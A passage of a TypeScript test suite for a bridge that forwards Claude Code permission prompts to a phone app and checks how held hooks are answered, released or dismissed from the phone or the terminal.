        currentPort: () => 8765,
        transcriptDiscovery: new TranscriptDiscovery(),
        holdMs: 60_000,
        hookTimeoutMs: 600_000,
      },
      {
        hookServer: hookServer as unknown as HookServer,
        sessionId: SID,
        workingDirectory: tmpDir,
        messageApi: localApi,
        sendAndRecord: () => {},
        tracker,
        hasLocalTerminal: true,
      },
    );
    bridgeHandles.push(handle);

    hookServer.fire('Notification', {
      session_id: 'claude-mixed',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'mixed.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    // The gate holds a binary main-agent request (#1126): escalateToUser
    // calls handlePermissionRequest -> onQuestion -> tracker.recordPendingHook,
    // and the hold pushes that record at once by id.
    const hook = hookServer.firePermission({
      session_id: 'claude-mixed',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Edit',
      tool_input: { file_path: '/tmp/x.ts' },
      permission_suggestions: [{ type: 'addDirectories', directories: ['/tmp'] }, 'Yes', 'No'],
    });

    expect(tracker.hasPendingForTest()).toBe(false);
    expect(pushed.length).toBe(1);
    expect(pushed[0]?.source).toBe('permission_request');
    expect(pushed[0]?.text).toBe('Allow Edit: /tmp/x.ts');
    // Neither the plain strings nor addDirectories name a grant a held card
    // can echo, so the card is the honest Yes/No pair.
    expect(pushed[0]?.options.map((o) => [o.label, o.isYes, o.isNo])).toEqual([
      ['Yes', true, false],
      ['No', false, true],
    ]);

    // The dialog renders during the hold: an echo of the open hook prompt,
    // never merged into a second card.
    tracker.onOrphanPTYPrompt({
      id: generateId(),
      text: 'Allow Edit: /tmp/x.ts?',
      options: [
        { label: '1', value: '1', isRecommended: false, isYes: false, isNo: false },
        { label: '2', value: '2', isRecommended: false, isYes: false, isNo: false },
      ],
      allowsFreeText: false,
      isAnswered: false,
    });
    expect(pushed.length).toBe(1);
    handle.gate.forceRelease('test');
    expect(await hook).toBe('passthrough');
  });

  // -------------------------------------------------------------------------
  // Phase 4 (#419): agent_id demoted from kill-switch to metadata.
  // Subagent PermissionRequest + Notification events flow through to the
  // tracker; push is gated by PTY presence, not by the agent_id tag.
  // -------------------------------------------------------------------------

  // (#1126 review) The test that drove a subagent prompt through the
  // non-hooked `onPTYPromptVisible` core and expected an answerable card was
  // removed: production routes a hooked session's renders through
  // `onOrphanPTYPrompt`, and a wrapper-mode subagent prompt gets a notice,
  // never a card (see "wrapper mode: passthrough, a notice when the dialog
  // renders").

  test('Phase 4 wiring: subagent PermissionRequest with no PTY confirmation drops cleanly', async () => {
    // Background subagent path: hook fires (agent_id set), no PTY emit
    // because the user is not hot-switched into this subagent's view.
    // The tracker holds the pending; a subsequent status transition
    // (PostToolUse -> 'thinking') clears it. No push reaches iOS.
    const pushed: Question[] = [];
    const localApi = fakeMessageAPI(messageApiLog);
    sessionRegistry.registerSession(SID, tmpDir, fakePTY(ptySubmits), localApi);
    const tracker = new QuestionPresenceTracker((q) => {
      pushed.push(q);
      return undefined;
    });

    bridgeHandles.push(
      setupHookBridge(
        {
          sessionRegistry,
          bindingStore,
          liveSessionsRegistry,
          transcriptWatchers: transcriptWatchers as unknown as Map<
            UUID,
            import('../../../src/transcript/transcript-watcher.ts').TranscriptWatcher
          >,
          transcriptFallbackTimers,
          currentPort: () => 8765,
          transcriptDiscovery: new TranscriptDiscovery(),
          holdMs: 60_000,
          hookTimeoutMs: 600_000,
        },
        {
          hookServer: hookServer as unknown as HookServer,
          sessionId: SID,
          workingDirectory: tmpDir,
          messageApi: localApi,
          sendAndRecord: () => {},
          tracker,
          hasLocalTerminal: true,
        },
      ),
    );

    hookServer.fire('Notification', {
      session_id: 'claude-sub-B',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'subB.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    hookServer.fire('PermissionRequest', {
      session_id: 'claude-sub-B',
      agent_id: 'subagent-B',
      agent_type: 'task',
      hook_event_name: 'PermissionRequest',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });

    expect(tracker.hasPendingForTest()).toBe(true);
    expect(pushed.length).toBe(0);

    // #763: a MAIN-tagged PostToolUse (routine status churn from another
    // agent's work) must NOT wipe the still-live parked record — the prompt
    // may not have had a chance to render yet.
    hookServer.fire('PostToolUse', {
      session_id: 'claude-sub-B',
      hook_event_name: 'PostToolUse',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
      tool_response: { exit_code: 0 },
    });
    expect(tracker.hasPendingForTest()).toBe(true);
    expect(pushed.length).toBe(0);

    // The subagent's OWN next tagged PreToolUse proves its permission
    // resolved without a render (allowlist absorbed / answered): the parked
    // record expires so it cannot stale-merge later. No push ever fired.
    hookServer.fire('PreToolUse', {
      session_id: 'claude-sub-B',
      agent_id: 'subagent-B',
      agent_type: 'task',
      hook_event_name: 'PreToolUse',
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
      tool_use_id: 'tu_sub_b_next',
    });
    expect(tracker.hasPendingForTest()).toBe(false);
    expect(pushed.length).toBe(0);
  });

  test('Phase 4 wiring: subagent Notification(permission_prompt) no longer records in tracker (#890, Q5)', async () => {
    // Notification(permission_prompt) used to be dropped at the listener
    // when agent_id was present; phase 4 (#419) made it flow to the tracker
    // like its PermissionRequest sibling. #890/Q5 deleted the question
    // synthesis Notification(permission_prompt) fed into that tracker slot
    // entirely (a capture corpus found the stash it fed always superseded
    // by the richer paired PermissionRequest, 68/68 pairs, 0 unpaired) --
    // the bridge's onQuestion callback now only stashes `source ===
    // 'permission_request'`, so a Notification with no preceding
    // PermissionRequest leaves the tracker with nothing pending at all.
    const { tracker } = build({ realTracker: true });

    hookServer.fire('Notification', {
      session_id: 'claude-sub-N',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'subN.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    hookServer.fire('Notification', {
      session_id: 'claude-sub-N',
      agent_id: 'subagent-N',
      hook_event_name: 'Notification',
      notification_type: 'permission_prompt',
      message: 'Claude needs your permission to use Bash',
    });

    expect(tracker.hasPendingForTest()).toBe(false);
  });

  test('#890 residual path: an UNPAIRED permission_prompt whose prompt renders still surfaces a card', async () => {
    // Q5's safety argument has two halves. The test above proves the first
    // (nothing is stashed anymore). This proves the second, which the PR
    // asserted in a comment but never exercised: with the stash gone, a
    // permission_prompt that arrives with NO paired PermissionRequest and then
    // DOES render must still reach the user, via the same orphan-PTY fallback
    // every genuinely hook-less prompt uses. If that were wrong, deleting the
    // synthesis would have turned the rare unpaired case into silence -- the
    // exact outcome the capture gate was meant to rule out.
    //
    // Driven through `onOrphanPTYPrompt`, which is what cli.ts routes to when a
    // hookServer is active, not the non-hooked `onPTYPromptVisible` core.
    const { tracker } = build({
      realTracker: true,
      realMessageApi: true,
      orphanDebounceMs: 5,
    });

    hookServer.fire('Notification', {
      session_id: 'claude-890-unpaired',
      hook_event_name: 'Notification',
      transcript_path: path.join(tmpDir, 'unpaired.jsonl'),
      notification_type: 'auth_success',
      message: '',
    });

    // No PermissionRequest -- this is the unpaired case by construction.
    hookServer.fire('Notification', {
      session_id: 'claude-890-unpaired',
      hook_event_name: 'Notification',
      notification_type: 'permission_prompt',
      message: 'Claude needs your permission to use Bash',
    });
    expect(tracker.hasPendingForTest()).toBe(false);
    expect(sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0).toBe(0);

    // The prompt renders anyway.
    tracker.onOrphanPTYPrompt({
      id: 'pty-q-890' as UUID,
      text: 'Allow Bash: curl example.com?',
      options: [],
      allowsFreeText: false,
      isAnswered: false,
      source: 'pty',
    });

    // Poll the debounce out rather than sleeping a guess.
    const deadline = Date.now() + 2000;
    while (
      (sessionRegistry.getSession(SID)?.currentQuestions.size ?? 0) === 0 &&
      Date.now() < deadline
    ) {
      await new Promise((resolve) => setTimeout(resolve, 5));
    }

    const questions = [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])];
    expect(questions).toHaveLength(1);
    // The PTY's own text and provenance survive -- nothing was merged over it,
    // because there is no hook record to merge.
    expect(questions[0]?.text).toBe('Allow Bash: curl example.com?');
    expect(questions[0]?.source).toBe('pty');
  });

  /**
   * #1126, end to end through the real bridge, gate, tracker, MessageAPI and
   * answer handler (wired with `gateAnswerDeps` + `trackerScreenDeps`, the
   * helpers cli.ts uses): a binary main-agent prompt holds its hook, its card
   * is pushed at hook time, and a phone answer becomes the hook response.
   * Nothing is ever typed into the PTY for it.
   */
  describe('held binary prompts answer through the hook (#1126)', () => {
    const E5_SUGGESTIONS = [
      { type: 'addDirectories', directories: [WRAPPED_DIRECTORY], destination: 'session' },
      { type: 'setMode', mode: 'acceptEdits', destination: 'session' },
    ];

    function lockSession(id: string): void {
      hookServer.fire('Notification', {
        session_id: id,
        hook_event_name: 'Notification',
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        notification_type: 'auth_success',
        message: '',
      });
    }

    function cards(): Question[] {
      return [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])];
    }

    function held(
      sessionTag: string,
      over: Record<string, unknown> = {},
      opts: Parameters<typeof build>[0] = {},
    ) {
      const built = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        ...opts,
      });
      lockSession(sessionTag);
      const hook = hookServer.firePermission({
        session_id: sessionTag,
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'touch e5-marker.txt' },
        ...over,
      });
      const card = cards()[0];
      if (!card) throw new Error('the held prompt pushed no card');
      const sent: ProtocolMessage[] = [];
      const handlers = createInputHandlers({
        sessionRegistry,
        bindingStore,
        send: (_c, m) => {
          sent.push(m);
          return true;
        },
        ...gateAnswerDeps(() => built.handle.gate),
        ...trackerScreenDeps(() => built.tracker),
        ...promptUpDeps(
          () => built.handle.gate,
          () => built.tracker,
        ),
      });
      return { ...built, hook, card, handlers, sent };
    }

    test('the card is pushed at hook time with options by meaning, before any render', async () => {
      const { card, hook, handle } = held('claude-held-card', {
        permission_suggestions: E5_SUGGESTIONS,
      });
      // addDirectories is never offered; setMode is the standing option.
      expect(card.options.map((o) => [o.label, o.isYes, o.isNo, o.suggestionIndex])).toEqual([
        ['Yes', true, false, undefined],
        ['Yes, and switch to acceptEdits mode', true, false, 1],
        ['No', false, true, undefined],
      ]);
      // A mode switch is not what the lock screen's static "Yes, always"
      // says, so this card is answered in the app (#1126 lead decision).
      expect(selectPushCategory(card.options)).toBeUndefined();
      expect(card.text).toBe('Allow Bash: touch e5-marker.txt');
      handle.gate.forceRelease('test');
      expect(await hook).toBe('passthrough');
    });

    test('phone Yes resolves the hold with allow; nothing typed, the card is consumed', async () => {
      const { card, hook, handlers } = held('claude-held-yes');
      const outcome = await handlers.relayAnswer(SID, card.id, 'Yes');
      expect(outcome).toBe('delivered');
      expect(await hook).toBe('allow');
      expect(ptySubmits).toEqual([]);
      expect(cards()).toHaveLength(0);
    });

    test("with Claude's dialog on screen, a phone answer still goes through the hook and nothing is typed", async () => {
      // The no-typing invariant at its sharpest: the dialog is rendered and
      // observed, its "1. Yes" matches the card's "Yes", so the screen guard
      // would let a digit through. The held path must answer first.
      const { tracker, card, hook, handlers } = held('claude-held-onscreen');
      tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
      expect(tracker.observedPromptOptions()?.[0]?.label).toBe('Yes');
      expect(await handlers.relayAnswer(SID, card.id, 'Yes')).toBe('delivered');
      expect(await hook).toBe('allow');
      expect(ptySubmits).toEqual([]);
    });

    test('chat text is refused while a held dialog is up, even before the screen parse sees it (#1142 + #1126)', async () => {
      const { card, hook, handlers, sent } = held('claude-held-chat');
      sessionRegistry.attachConnection(SID, 'conn-chat' as UUID);
      // No render observed yet: only the hold says a dialog is up.
      await handlers.onUserInput('conn-chat' as UUID, SID, 'please go ahead', false);
      expect(ptySubmits).toEqual([]);
      const refusal = sent.find((m) => m.type === 'error') as
        | { code?: string; message?: string }
        | undefined;
      expect(refusal?.code).toBe('PROMPT_WAITING');
      // A held prompt may already be answered in the terminal (its tool
      // running), so the refusal does not claim a dialog is up.
      expect(refusal?.message).toBe(PROMPT_WAITING_HELD_MESSAGE);
      // Answered from the phone: the dialog is gone, chat flows again.
      await handlers.relayAnswer(SID, card.id, 'Yes');
      expect(await hook).toBe('allow');
      await handlers.onUserInput('conn-chat' as UUID, SID, 'thanks', false);
      expect(ptySubmits).toEqual(['thanks']);
    });

    test('phone No with a message denies with that message as the reason', async () => {
      const { card, hook, handlers } = held('claude-held-no');
      await handlers.onAnswer('conn-1' as UUID, SID, card.id, 'No', undefined, {
        message: 'run the tests first',
      });
      expect(await hook).toEqual({ behavior: 'deny', message: 'run the tests first' });
      expect(ptySubmits).toEqual([]);
    });

    test('phone setMode echoes it; phone addRules echoes it for this session', async () => {
      const a = held('claude-held-mode', { permission_suggestions: E5_SUGGESTIONS });
      const mode = a.card.options[1] as QuestionOption;
      await a.handlers.relayAnswer(SID, a.card.id, mode.label);
      expect(await a.hook).toEqual({
        behavior: 'allow',
        updatedPermissions: [E5_SUGGESTIONS[1]],
      });

      const rule = {
        type: 'addRules',
        rules: [{ toolName: 'Bash', ruleContent: 'touch e5-marker.txt' }],
        behavior: 'allow',
        destination: 'localSettings',
      };
      const hookB = hookServer.firePermission({
        session_id: 'claude-held-mode',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'touch e5-other.txt' },
        permission_suggestions: [rule],
      });
      const cardB = cards()[0] as Question;
      expect(cardB.options[1]?.label).toBe('Yes, allow touch e5-marker.txt for this session');
      // The in-app tap sends the option VALUE.
      await a.handlers.onAnswer('conn-1' as UUID, SID, cardB.id, '2');
      expect(await hookB).toEqual({
        behavior: 'allow',
        updatedPermissions: [{ ...rule, destination: 'session' }],
      });
      expect(ptySubmits).toEqual([]);
    });

    test('Cancel on a held card denies through the hook and types no Esc', async () => {
      const { card, hook, handlers } = held('claude-held-cancel');
      await handlers.onAnswer('conn-1' as UUID, SID, card.id, '', undefined, { cancel: true });
      expect(await hook).toBe('deny');
      expect(ptySubmits).toEqual([]);
      expect(cards()).toHaveLength(0);
    });

    test('a duplicate delivery of the same tap resolves once and reports delivered (#752)', async () => {
      const { card, hook, handlers } = held('claude-held-dup');
      const [a, b] = await Promise.all([
        handlers.relayAnswer(SID, card.id, 'Yes'),
        handlers.relayAnswer(SID, card.id, '1'),
      ]);
      expect([a, b]).toEqual(['delivered', 'delivered']);
      expect(await hook).toBe('allow');
      expect(ptySubmits).toEqual([]);
    });

    test('free text on a held card is refused; the card and the hold stay', async () => {
      const { card, handlers, sent, handle, hook } = held('claude-held-text');
      const outcome = await handlers.onAnswer(
        'conn-1' as UUID,
        SID,
        card.id,
        'no, do not create the file',
      );
      expect(outcome).toBeUndefined();
      expect(ptySubmits).toEqual([]);
      expect((sent.find((m) => m.type === 'error') as { code?: string })?.code).toBe(
        'STALE_ANSWER',
      );
      expect(cards().map((q) => q.id)).toEqual([card.id]);
      expect(handle.gate.answerHeld(card.id, { kind: 'cancel' })).toBe('resolved');
      expect(await hook).toBe('deny');
    });

    test('a Yes answered in the terminal: the paired PostToolUse closes the hold empty and dismisses the card', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        broadcastResolvedLog,
      });
      lockSession('claude-local-yes');
      const call = {
        session_id: 'claude-local-yes',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      };
      // Claude announces the call, then asks about it about 10 ms later.
      hookServer.fire('PreToolUse', {
        ...call,
        hook_event_name: 'PreToolUse',
        tool_use_id: 'tu-1',
      });
      const hook = hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' });
      const card = cards()[0] as Question;

      // A DIFFERENT call with the same command finishing must not close it:
      // the prompt was paired with tu-1.
      hookServer.fire('PostToolUse', {
        ...call,
        hook_event_name: 'PostToolUse',
        tool_use_id: 'tu-0',
      });
      expect(cards().map((q) => q.id)).toEqual([card.id]);

      // The terminal's Yes: Claude runs the tool and reports tu-1.
      hookServer.fire('PostToolUse', {
        ...call,
        hook_event_name: 'PostToolUse',
        tool_use_id: 'tu-1',
      });
      expect(await hook).toBe('passthrough');
      expect(cards()).toHaveLength(0);
      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
      expect(ptySubmits).toEqual([]);
    });

    test('a Yes in the terminal whose tool then fails (PostToolUseFailure) also closes the hold', async () => {
      build({ realTracker: true, realMessageApi: true, liveQuestionDeps: true });
      lockSession('claude-local-fail');
      const call = {
        session_id: 'claude-local-fail',
        tool_name: 'Bash',
        tool_input: { command: 'false' },
      };
      hookServer.fire('PreToolUse', {
        ...call,
        hook_event_name: 'PreToolUse',
        tool_use_id: 'tu-f',
      });
      const hook = hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' });
      hookServer.fire('PostToolUseFailure', {
        ...call,
        hook_event_name: 'PostToolUseFailure',
        tool_use_id: 'tu-f',
        error: 'exit 1',
      });
      expect(await hook).toBe('passthrough');
      expect(cards()).toHaveLength(0);
    });

    test('a No or Esc in the terminal: Claude closes the held request and the card is dismissed', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      const { handle } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        broadcastResolvedLog,
      });
      lockSession('claude-local-no');
      const client = new AbortController();
      void hookServer.firePermission(
        {
          session_id: 'claude-local-no',
          hook_event_name: 'PermissionRequest',
          tool_name: 'Bash',
          tool_input: { command: 'rm x' },
        },
        client.signal,
      );
      const card = cards()[0] as Question;
      client.abort();
      expect(cards()).toHaveLength(0);
      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
      expect(handle.gate.answerHeld(card.id, { kind: 'cancel' })).toBe('closed');
      expect(ptySubmits).toEqual([]);
    });

    test('a main-agent StopFailure ends a live held prompt: hook released, card resolved, no later deadline notice (#1153)', async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      const { card, hook } = held(
        'claude-held-sf',
        {},
        { holdMs: 40, noticeLog, broadcastResolvedLog },
      );

      hookServer.fire('StopFailure', {
        session_id: 'claude-held-sf',
        hook_event_name: 'StopFailure',
        error: 'rate_limit',
      });

      expect(await hook).toBe('passthrough');
      expect(cards()).toHaveLength(0);
      expect(broadcastResolvedLog).toEqual([{ questionId: card.id, reason: 'cancelled' }]);
      // Well past the 40 ms deadline: the released hold fires no notice.
      await new Promise((resolve) => setTimeout(resolve, 120));
      expect(noticeLog).toEqual([]);
      expect(ptySubmits).toEqual([]);
    });

    test('an agent_id-tagged StopFailure sweeps nothing: a live main hold survives it (#1153)', async () => {
      const { handle, card, hook } = held('claude-held-sf-sub', {}, { holdMs: 60_000 });
      messageApiLog.statusCalls.length = 0;

      hookServer.fire('StopFailure', {
        session_id: 'claude-held-sf-sub',
        hook_event_name: 'StopFailure',
        error: 'rate_limit',
        agent_id: 'agent-9',
        agent_type: 'general-purpose',
      });

      expect(cards().map((q) => q.id)).toEqual([card.id]);
      expect(messageApiLog.statusCalls).toEqual([]);
      handle.gate.forceRelease('test');
      expect(await hook).toBe('passthrough');
    });

    test('a new user prompt closes a main prompt left open after its hold was released', async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const { handle } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        holdMs: 20,
        noticeLog,
      });
      lockSession('claude-local-next');
      const hook = hookServer.firePermission({
        session_id: 'claude-local-next',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'rm y' },
      });
      const card = cards()[0] as Question;
      expect(await hook).toBe('passthrough'); // released at the deadline
      expect(handle.gate.answerHeld(card.id, { kind: 'cancel' })).toBe('closed');

      // A subagent's prompt submission is not the user's: nothing closes.
      hookServer.fire('UserPromptSubmit', {
        session_id: 'claude-local-next',
        hook_event_name: 'UserPromptSubmit',
        prompt: 'x',
        agent_id: 'agent-1',
      });
      expect(noticeLog.filter((n) => n.reason === 'dismissed')).toHaveLength(0);

      // The terminal's No fired nothing; the user's next prompt proves the
      // dialog is gone, and the deadline notice is cleared.
      hookServer.fire('UserPromptSubmit', {
        session_id: 'claude-local-next',
        hook_event_name: 'UserPromptSubmit',
        prompt: 'next',
      });
      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline', 'dismissed']);
    });

    test('an early release by a name + input match keeps the dialog open, tells the phone, and its redraw builds no typed card', async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const { tracker, card, hook } = held(
        'claude-held-early',
        {},
        { orphanDebounceMs: 5, noticeLog },
      );
      const dialog = parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question;
      tracker.onOrphanPTYPrompt(dialog);
      // Unpaired (no PreToolUse seen): an identical call's PostToolUse can
      // only release the hold to the terminal.
      hookServer.fire('PostToolUse', {
        session_id: 'claude-held-early',
        hook_event_name: 'PostToolUse',
        tool_name: 'Bash',
        tool_input: { command: 'touch e5-marker.txt' },
        tool_use_id: 'tu-other',
      });
      expect(await hook).toBe('passthrough');
      expect(cards().map((q) => q.id)).not.toContain(card.id);
      // Not silent (#1126 review): the card is gone, so the phone is told
      // the prompt went back to the terminal.
      expect(noticeLog).toEqual([
        { questionId: card.id, text: 'Allow Bash: touch e5-marker.txt', reason: 'released' },
      ]);
      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
      await new Promise((resolve) => setTimeout(resolve, 30));
      expect(cards()).toHaveLength(0);
      expect(ptySubmits).toEqual([]);
      // The terminal answers it later: the notice clears.
      hookServer.fire('UserPromptSubmit', {
        session_id: 'claude-held-early',
        hook_event_name: 'UserPromptSubmit',
        prompt: 'next',
      });
      expect(noticeLog.map((n) => n.reason)).toEqual(['released', 'dismissed']);
    });

    test('the release notice wording follows the cause and the mode', () => {
      expect(terminalNoticeReason('deadline', true)).toBe('hold_deadline');
      expect(terminalNoticeReason('deadline', false)).toBe('hold_deadline_no_terminal');
      expect(terminalNoticeReason('released', true)).toBe('released');
      expect(terminalNoticeReason('released', false)).toBe('released_no_terminal');
    });

    test('a non-string message is dropped, not thrown on: the No still denies', async () => {
      const { card, hook, handlers } = held('claude-held-badmsg');
      await handlers.onAnswer('conn-1' as UUID, SID, card.id, 'No', undefined, {
        message: 42 as unknown as string,
      });
      expect(await hook).toBe('deny');
    });

    test('a transcript rotation releases a live hold and clears its card', async () => {
      const broadcastResolvedLog: Array<{ questionId: UUID; reason: string }> = [];
      build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        broadcastResolvedLog,
      });
      lockSession('claude-rot-A');
      const hook = hookServer.firePermission({
        session_id: 'claude-rot-A',
        hook_event_name: 'PermissionRequest',
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      });
      const card = cards()[0] as Question;
      // The way a rotation actually arrives post-#930: SessionEnd for the old
      // id, then any event for the new one.
      hookServer.fire('SessionEnd', {
        session_id: 'claude-rot-A',
        hook_event_name: 'SessionEnd',
        reason: 'clear',
      });
      lockSession('claude-rot-B');
      expect(await hook).toBe('passthrough');
      expect(cards()).toHaveLength(0);
      expect(broadcastResolvedLog.map((r) => r.questionId)).toContain(card.id);
    });

    test('a released main prompt stops suppressing after the hold length: a redraw takes the guarded hook-less path', async () => {
      const { tracker, card, hook } = held(
        'claude-held-expire',
        {},
        { holdMs: 25, orphanDebounceMs: 5 },
      );
      const dialog = parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question;
      tracker.onOrphanPTYPrompt(dialog);
      expect(await hook).toBe('passthrough'); // released at the deadline
      expect(cards()).toHaveLength(0);
      // Past the hold length (a No in the terminal fires no hook, so nothing
      // would ever end the suppression): a redraw is treated as hook-less.
      await new Promise((resolve) => setTimeout(resolve, 40));
      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
      await new Promise((resolve) => setTimeout(resolve, 30));
      const orphan = cards();
      expect(orphan).toHaveLength(1);
      expect(orphan[0]?.id).not.toBe(card.id);
      // A typed card, answered only on an exact label match (#1134); nothing
      // is typed without an answer.
      expect(ptySubmits).toEqual([]);
    });

    test('closing the session releases a live hold', async () => {
      const { hook, handle } = held('claude-held-close');
      handle.closeBinder();
      expect(await hook).toBe('passthrough');
      expect(cards()).toHaveLength(0);
    });

    test("the dialog's render during the hold is an echo, and after the deadline a redraw still builds no typed card", async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      // The hold length also bounds how long the released prompt suppresses
      // orphans, so it is long enough to cover the redraws below.
      const { tracker, card, hook, handlers } = held(
        'claude-held-deadline',
        {},
        { holdMs: 150, orphanDebounceMs: 5, noticeLog },
      );
      const dialog = parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question;
      tracker.onOrphanPTYPrompt(dialog);
      expect(cards().map((q) => q.id)).toEqual([card.id]);

      // The deadline: the empty response, the card dismissed, the notice
      // naming the ask.
      expect(await hook).toBe('passthrough');
      expect(cards()).toHaveLength(0);
      expect(noticeLog).toEqual([
        { questionId: card.id, text: 'Allow Bash: touch e5-marker.txt', reason: 'hold_deadline' },
      ]);

      // Claude's dialog is still up; a redraw must not become an orphan card
      // the phone could answer by typing.
      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
      await new Promise((resolve) => setTimeout(resolve, 30));
      expect(cards()).toHaveLength(0);

      // A late answer to the dismissed card is stale, and nothing is typed.
      expect(await handlers.relayAnswer(SID, card.id, 'Yes')).toBe('stale');
      expect(ptySubmits).toEqual([]);
      // ...and it does not close the prompt still waiting in the terminal:
      // the notice stays and a later redraw is still no orphan card.
      expect(noticeLog.map((n) => n.reason)).toEqual(['hold_deadline']);
      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
      await new Promise((resolve) => setTimeout(resolve, 30));
      expect(cards()).toHaveLength(0);
    });
  });

  /**
   * #1126: a background subagent's dialog does not render while its hook is
   * held. With a local terminal the hook passes through and the phone gets
   * an informational notice when the dialog renders, never a card; without
   * one the prompt is held and answerable like a main prompt.
   */
  describe('subagent prompts by local terminal (#1126)', () => {
    function lockSession(id: string): void {
      hookServer.fire('Notification', {
        session_id: id,
        hook_event_name: 'Notification',
        transcript_path: path.join(tmpDir, `${id}.jsonl`),
        notification_type: 'auth_success',
        message: '',
      });
    }
    function cards(): Question[] {
      return [...(sessionRegistry.getSession(SID)?.currentQuestions.values() ?? [])];
    }
    const subCall = (session: string) => ({
      session_id: session,
      agent_id: 'agent-bg',
      agent_type: 'code-reviewer',
      tool_name: 'Bash',
      tool_input: { command: 'rm -rf build' },
    });

    test('wrapper mode: passthrough, a notice when the dialog renders, no card, nothing typed, cleared on answer', async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const { tracker } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        orphanDebounceMs: 5,
        noticeLog,
      });
      lockSession('claude-sub-wrap');
      const call = subCall('claude-sub-wrap');
      expect(
        await hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' }),
      ).toBe('passthrough');
      expect(noticeLog).toEqual([]); // nothing until the dialog renders

      const dialog = parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question;
      tracker.onOrphanPTYPrompt(dialog);
      expect(noticeLog).toHaveLength(1);
      expect(noticeLog[0]?.reason).toBe('subagent');
      expect(noticeLog[0]?.text).toBe('code-reviewer · Bash: rm -rf build');
      // Informational only: no card exists to answer, so nothing can be typed.
      expect(cards()).toHaveLength(0);

      // A redraw is the same open prompt, never an orphan card: the phone
      // keeps exactly one artifact, the notice.
      tracker.onOrphanPTYPrompt({ ...dialog, id: generateId() });
      await new Promise((resolve) => setTimeout(resolve, 30));
      expect(cards()).toHaveLength(0);
      expect(ptySubmits).toEqual([]);

      // Answered Yes in the terminal: the tool runs, the notice clears.
      hookServer.fire('PostToolUse', { ...call, hook_event_name: 'PostToolUse' });
      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent', 'dismissed']);
      expect(noticeLog[1]?.questionId).toBe(noticeLog[0]?.questionId as UUID);
    });

    test("wrapper mode: a teammate's prompt answered No in the terminal is cleared by its next call; then a hook-less prompt gets its card", async () => {
      const noticeLog: Array<{ questionId: UUID; text: string; reason: string }> = [];
      const { tracker } = build({
        realTracker: true,
        realMessageApi: true,
        liveQuestionDeps: true,
        orphanDebounceMs: 5,
        noticeLog,
      });
      lockSession('claude-sub-no');
      const call = subCall('claude-sub-no');
      expect(
        await hookServer.firePermission({ ...call, hook_event_name: 'PermissionRequest' }),
      ).toBe('passthrough');
      tracker.onOrphanPTYPrompt(parseQuestion(WRAPPED_DIRECTORY_DIALOG).question as Question);
      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent']);
      // The user answers No in the terminal: no hook fires. The teammate
      // moves on: its next call proves the No, so the prompt is cleared and
      // its notice dismissed without waiting for SubagentStop.
      hookServer.fire('PreToolUse', {
        ...call,
        hook_event_name: 'PreToolUse',
        tool_input: { command: 'ls' },
        tool_use_id: 'tu-next',
      });
      expect(noticeLog.map((n) => n.reason)).toEqual(['subagent', 'dismissed']);
      // A hook-less prompt (a sandbox network dialog) renders next: the
      // cleared entry no longer suppresses it, so it gets its card.
      tracker.onOrphanPTYPrompt({
        id: generateId(),
        text: 'Allow network access to example.com?',
        options: [
          { label: 'Yes', value: '1', isRecommended: true, isYes: false, isNo: false },
          { label: 'No', value: '2', isRecommended: false, isYes: false, isNo: false },
        ],
        allowsFreeText: false,
        isAnswered: false,
        source: 'pty',
      });
      await new Promise((resolve) => setTimeout(resolve, 40));
